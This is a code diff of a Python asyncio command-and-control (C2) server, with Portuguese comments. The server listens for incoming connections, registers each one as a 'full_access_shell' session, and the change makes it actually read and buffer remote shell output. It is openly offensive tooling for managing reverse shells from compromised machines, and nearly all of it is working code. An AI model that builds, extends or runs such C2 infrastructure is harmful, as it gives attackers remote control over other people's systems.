@@ -1,30 +1,31 @@
 import asyncio
 from typing import Dict, List, Optional
-from asyncio import Queue
-from .session import Session # Importação relativa
+
+from .session import Session
+
 
 class C2Server:
-    def __init__(self, c2_ip: str, c2_port: int, session_notification_queue: Queue):
-        self.c2_ip = c2_ip
-        self.c2_port = c2_port
-        self.active_sessions: Dict[str, Session] = {} # Dicionário de sessões ativas
-        self.session_notification_queue = session_notification_queue # Para notificar o console
+    def __init__(self, bind_host: str, port: int):
+        self.bind_host = bind_host
+        self.port = port
+        self.active_sessions: Dict[str, Session] = {}
         self.server: Optional[asyncio.Server] = None
 
     async def _handle_client_connection(self, reader, writer):
-        peername = writer.get_extra_info('peername')
-        session = Session(reader, writer, peername, session_type="full_access_shell") # Assumindo full access por enquanto
+        peername = writer.get_extra_info("peername") or ("unknown", 0)
+        session = Session(reader, writer, peername, session_type="full_access_shell")
         self.active_sessions[session.id] = session
-        print(f"[*] Nova conexão de shell de {session.ip_address}:{session.port} - ID: {session.id}")
-        
-        # Notificar o InteractiveConsole sobre a nova sessão
-        await self.session_notification_queue.put(f"NEW_SESSION:{session.id}:{session.ip_address}")
+        print(f"[*] Nova sessão {session.id} — {session.ip_address}:{session.port}")
 
         try:
             while True:
-                # Aqui você gerenciaria a interação da shell, leitura de output, etc.
-                # await session.read_output() # Descomente quando implementar
-                await asyncio.sleep(1) # Simula o processamento da shell
+                data = await reader.read(65536)
+                if not data:
+                    break
+                text = data.decode("utf-8", errors="replace")
+                session.output_buffer.append(text)
+        except (ConnectionResetError, BrokenPipeError, asyncio.CancelledError):
+            pass
         except Exception as e:
             print(f"[-] Erro na sessão {session.id}: {e}")
         finally:
@@ -34,7 +35,6 @@ class C2Server:
                 del self.active_sessions[session.id]
             writer.close()
             await writer.wait_closed()
-            await self.session_notification_queue.put(f"SESSION_CLOSED:{session.id}")
 
     def get_sessions_summary(self) -> List[dict]:
         """Retorna um resumo das sessões ativas para exibição."""
@@ -46,9 +46,9 @@ class C2Server:
         
     async def start(self):
         self.server = await asyncio.start_server(
-            self._handle_client_connection, self.c2_ip, self.c2_port
+            self._handle_client_connection, self.bind_host, self.port
         )
-        print(f"[*] C2 Server ouvindo em {self.c2_ip}:{self.c2_port}...")
+        print(f"[*] C2 ouvindo em {self.bind_host}:{self.port}")
         async with self.server:
             await self.server.serve_forever()
 
